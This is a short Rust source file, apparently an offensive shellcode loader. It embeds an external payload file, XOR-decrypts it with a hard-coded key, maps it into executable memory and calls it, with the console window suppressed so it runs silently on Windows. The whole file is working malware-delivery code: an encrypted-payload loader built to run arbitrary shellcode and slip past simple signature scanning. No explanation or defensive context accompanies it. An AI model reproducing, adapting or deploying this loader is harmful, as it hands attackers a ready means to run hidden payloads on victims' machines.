#![windows_subsystem = "windows"]

use memmap2::MmapOptions;
use std::mem::transmute;

const SHELLCODE: &[u8] = include_bytes!("../../shellcode.bin");
const SIZE: usize = SHELLCODE.len();
const KEY: &str = "rust8";

fn decrypt_shellcode(shellcode: &mut [u8], key: &str){
    let key_bytes = key.as_bytes();
    for (i, byte) in shellcode.iter_mut().enumerate(){
        *byte ^= key_bytes[i % key_bytes.len()];
    }
}

#[cfg(target_os = "windows")]
fn main() {
    let mut decrypted_shellcode = SHELLCODE.to_vec();
    decrypt_shellcode(&mut decrypted_shellcode, KEY);
    let mut mmap = MmapOptions::new()
        .len(SIZE)
        .map_anon()
        .expect("mmap failed!");
    mmap.copy_from_slice(&decrypted_shellcode);
    let mmap = mmap.make_exec().expect("make_exec failed!");

    unsafe {
        let shell: unsafe extern "C" fn() = transmute(mmap.as_ptr());
        shell();
    }
}
